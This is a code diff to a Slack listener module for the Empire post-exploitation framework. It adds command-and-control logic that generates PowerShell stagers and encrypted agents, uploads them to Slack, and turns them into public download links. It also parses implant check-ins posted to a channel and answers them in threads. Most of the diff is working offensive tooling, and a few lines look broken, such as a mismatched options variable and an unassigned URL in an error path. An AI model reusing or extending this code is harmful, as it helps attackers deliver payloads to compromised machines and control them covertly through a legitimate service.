@@ -8,6 +8,7 @@ import copy
 import traceback
 import sys
 import json
+import string
 from pydispatch import dispatcher
 from slackclient import SlackClient
 
@@ -47,9 +48,14 @@ class Listener:
                 'Value'         :   'slack'
             },
             'APIToken' : {
-                'Description'   :   'API Token, visit https://slack.com/apps/A0F7YS25R to get one.',
+                'Description'   :   'Bot API Token, visit https://slack.com/apps/A0F7YS25R to get one.',
                 'Required'      :   True,
                 'Value'         :   'xoxb-123456789123-123456789123-ExampleSlackAPIToken'
+            },
+            'UserAPIToken' : {
+                'Description'   :   'API Token, used for staging visit https://api.slack.com/custom-integrations/legacy-tokens to get one.',
+                'Required'      :   True,
+                'Value'         :   'xoxp-123456789123-123456789123-ExampleSlackAPIToken'
             },
             'ChannelComms' : {
                 'Description'   :   'The Slack channel to use for comms.',
@@ -64,7 +70,7 @@ class Listener:
             'StartMessage' : {
                 'Description'   :   'When the listener starts it will post this message to the Slack channel, just a bit of fun.',
                 'Required'      :   False,
-                'Value'         :   'An Empire listener for Slack has started. :point_up:'
+                'Value'         :   None
             },
             'Launcher' : {
                 'Description'   :   'Launcher string.',
@@ -153,7 +159,7 @@ class Listener:
         If there's a default response expected from the server that the client needs to ignore,
         (i.e. a default HTTP page), put the generation here.
         """
-        print helpers.color("[!] default_response() not implemented for listeners/template")
+        #print helpers.color("[!] default_response() not implemented for listeners/template")
         return ''
 
 
@@ -311,7 +317,7 @@ class Listener:
             print helpers.color("[!] listeners/slack generate_launcher(): invalid listener name")
 
 
-    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None, token=None):
+    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None):
         """
         Generate the stager code
         """
@@ -321,13 +327,11 @@ class Listener:
             return None
 
         staging_key = listenerOptions['StagingKey']['Value']
-        base_folder = listenerOptions['BaseFolder']['Value']
-        staging_folder = listenerOptions['StagingFolder']['Value']
         working_hours = listenerOptions['WorkingHours']['Value']
         profile = listenerOptions['DefaultProfile']['Value']
         agent_delay = listenerOptions['DefaultDelay']['Value']
-        api_token = listener_options['APIToken']['Value']
-        channel_id = listener_options['ChannelComms_ID']['Value']
+        api_token = listenerOptions['APIToken']['Value']
+        channel_id = listenerOptions['ChannelComms_ID']['Value']
 
         if language.lower() == 'powershell':
             f = open("%s/data/agent/stagers/slack.ps1" % self.mainMenu.installPath)
@@ -364,7 +368,7 @@ class Listener:
             print helpers.color("[!] Python agent not available for Slack")
 
 
-    def generate_agent(self, listener_options, client_id, token, refresh_token, redirect_uri, language=None):
+    def generate_agent(self, listener_options, language=None):
         """
         Generate the agent code
         """
@@ -387,7 +391,7 @@ class Listener:
             agent_code = f.read()
             f.close()
 
-            comms_code = self.generate_comms(listener_options, client_id, token, refresh_token, redirect_uri, language)
+            comms_code = self.generate_comms(listener_options, language)
             agent_code = agent_code.replace("REPLACE_COMMS", comms_code)
 
             agent_code = helpers.strip_powershell_comments(agent_code)
@@ -412,16 +416,11 @@ class Listener:
         This should be implemented for the module.
         """
 
-        api_token = listener_options['APIToken']['Value']
-        channel_id = listener_options['ChannelComms_ID']['Value']
+        api_token = listenerOptions['APIToken']['Value']
+        channel_id = listenerOptions['ChannelComms_ID']['Value']
 
         if language:
             if language.lower() == 'powershell':
-
-                updateServers = """
-                    $Script:ControlServers = @("%s");
-                    $Script:ServerIndex = 0;
-                """ % (listenerOptions['Host']['Value'])
 
                 getTask = """
                     $script:GetTask = {
@@ -456,7 +455,6 @@ class Listener:
 
                             $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
                             $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
-                            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie",\"""" + self.session_cookie + """=$RoutingCookie")
 
                             # choose a random valid URI for checkin
                             $taskURI = $script:TaskURIs | Get-Random
@@ -537,7 +535,7 @@ class Listener:
                     }
                 """ % (api_token, channel_id)
 
-                return updateServers + getTask + sendMessage + "\n'New agent comms registered!'"
+                return getTask + sendMessage + "\n'New agent comms registered!'"
 
             elif language.lower() == 'python':
                 # send_message()
@@ -555,24 +553,79 @@ class Listener:
 
             # Parses a list of events coming from the Slack RTM API to find commands.
             for event in slack_events:
-                if event["type"] == "message" and not "subtype" in event:
+                if event["type"] == "message" and event["channel"] != bot_id:
 
-                    # split format of {{AGENT_NAME}}:{{BASE64_RC4}}
-                    if ':' in event["text"] and not event["user"] == bot_id:
-                        agent, message = event["text"].split(':')
-                        return agent, message
+                    event_details = slack_client.api_call("channels.history",channel=channel_id,latest=event["ts"],inclusive=True,count=1)
+                    if 'messages' in event_details:
+                        message = event_details["messages"][0]
+                        thread_ts = message["ts"]
+                        if 'username' in message:
+                            data = base64.b64decode(message["text"].replace(' ','+'))
+                            agent = message["username"]
+                            if ':' in agent:
+                                agent, stage = agent.split(':')
+                                return agent, stage, data, thread_ts
 
-            return None, None
+            return None, None, None, None
 
         # utility functions for handling Empire
-        def upload_launcher():
-            pass
+        def upload_agent(enc_code):
+
+            random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(10)])
+            file_info = user_slack_client.api_call('files.upload',file=enc_code,filename=random_name.lower(),channels=bot_id)
+            
+            if 'file' in file_info:
+                # grab the file id and set the file to public
+                file_id = file_info["file"]["id"]
+                file_info = user_slack_client.api_call('files.sharedPublicURL',file=file_id)
+
+                # generate the perma direct link
+                file_pub = file_info["file"]["permalink_public"].split('/')[-1]
+                file_pub = file_pub.split('-')
+                agent_url = 'https://files.slack.com/files-pri/%s-%s/REPLACE_NAME?pub_secret=%s' % tuple(file_pub)
+                agent_url = agent_url.replace('REPLACE_NAME',file_info["file"]["name"])
+
+                # set the stager URL to use
+                return agent_url
+
+            else:
+                print helpers.color("[!] Something went wrong uploading agent")
+                message = stager_url
+                signal = json.dumps({
+                    'print' : True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
 
         def upload_stager():
-            pass
 
-        def handle_stager():
-            pass
+            ps_stager = self.generate_stager(listenerOptions=listener_options, language='powershell')
+
+            random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(10)])
+            file_info = user_slack_client.api_call('files.upload',file=ps_stager,filename=random_name.lower(),channels=bot_id)
+            
+            if 'file' in file_info:
+                # grab the file id and set the file to public
+                file_id = file_info["file"]["id"]
+                file_info = user_slack_client.api_call('files.sharedPublicURL',file=file_id)
+
+                # generate the perma direct link
+                file_pub = file_info["file"]["permalink_public"].split('/')[-1]
+                file_pub = file_pub.split('-')
+                stager_url = 'https://files.slack.com/files-pri/%s-%s/REPLACE_NAME?pub_secret=%s' % tuple(file_pub)
+                stager_url = stager_url.replace('REPLACE_NAME',file_info["file"]["name"])
+
+                # set the stager URL to use
+                self.mainMenu.listeners.activeListeners[listener_name]['stager_url'] = stager_url
+
+            else:
+                print helpers.color("[!] Something went wrong uploading stager")
+                message = stager_url
+                signal = json.dumps({
+                    'print' : True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
 
         listener_options = copy.deepcopy(listenerOptions)
 
@@ -580,24 +633,32 @@ class Listener:
         staging_key = listener_options['StagingKey']['Value']
         poll_interval = listener_options['PollInterval']['Value']
         api_token = listener_options['APIToken']['Value']
+        user_api_token = listener_options['UserAPIToken']['Value']
         channel_id = listener_options['ChannelComms_ID']['Value']
         startup_message = listener_options['StartMessage']['Value']
 
         slack_client = SlackClient(api_token)
+        user_slack_client = SlackClient(user_api_token)
 
         if slack_client.rtm_connect(with_team_state=False,auto_reconnect=True):
 
             # Read bot's user ID by calling Web API method `auth.test`
             bot_id = slack_client.api_call("auth.test")["user_id"]
 
+            while True:
+                #Wait until Empire is aware the listener is running, so we can save our stager URL
+                try:
+                    if listener_name in self.mainMenu.listeners.activeListeners.keys():
+                        upload_stager()
+                        break
+                    else:
+                        time.sleep(1)
+                except AttributeError:
+                    time.sleep(1)
+
             # post a message if present
             if startup_message:
-                slack_client.api_call(
-                    "chat.postMessage",
-                    channel=channel_id,
-                    as_user=True,
-                    text=startup_message
-                )
+                slack_client.api_call("chat.postMessage", channel=channel_id, as_user=False, username='listener_' + listener_name, text=startup_message)
             
             # Set the listener in a while loop
             while True:
@@ -607,19 +668,28 @@ class Listener:
 
                 # try to process command sent if fails then simply wait until next poll interval and try again
                 try:
-                    agent, message = parse_commands(slack_client.rtm_read(),bot_id)
-                    if message:
-                        slack_client.api_call(
-                            "chat.postMessage",
-                            channel=channel_id,
-                            as_user=True,
-                            text='Not implemented.'
-                        )
-                        print helpers.color('[!] Not implemented... message from "{}": {}'.format(agent,message))
+                    agent, stage, data, thread_ts = parse_commands(slack_client.rtm_read(),bot_id)
+
+                    # if there is some data then proceed
+                    if data:
+
+                        if stage == '3':
+                            lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, data, listener_options)[0]
+
+                            session_key = self.mainMenu.agents.agents[agent]['sessionKey']
+                            agent_code = str(self.generate_agent(listener_options, lang))
+                            enc_code = encryption.aes_encrypt_then_hmac(session_key, agent_code)
+
+                            agent_upload = upload_agent(enc_code)
+                            response = slack_client.api_call("chat.postMessage", channel=channel_id, as_user=False, username='listener_' + listener_name, text=agent_upload, thread_ts=thread_ts)
+
+                            #dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
+                            #s.delete("%s/drive/items/%s" % (base_url, item['id']))
+
                    
                 except Exception as e:
-                    print helpers.color("[!] The command '" + str(command) + "' was sent by '" + str(user) + "' but failed. Exception is '" + str(e) + "'")
-                
+                    print helpers.color("[!] Something went wrong with the Slack bot: " + str(e))
+
         else:
             print helpers.color("[!] Connection failed. Exception printed above.")
         
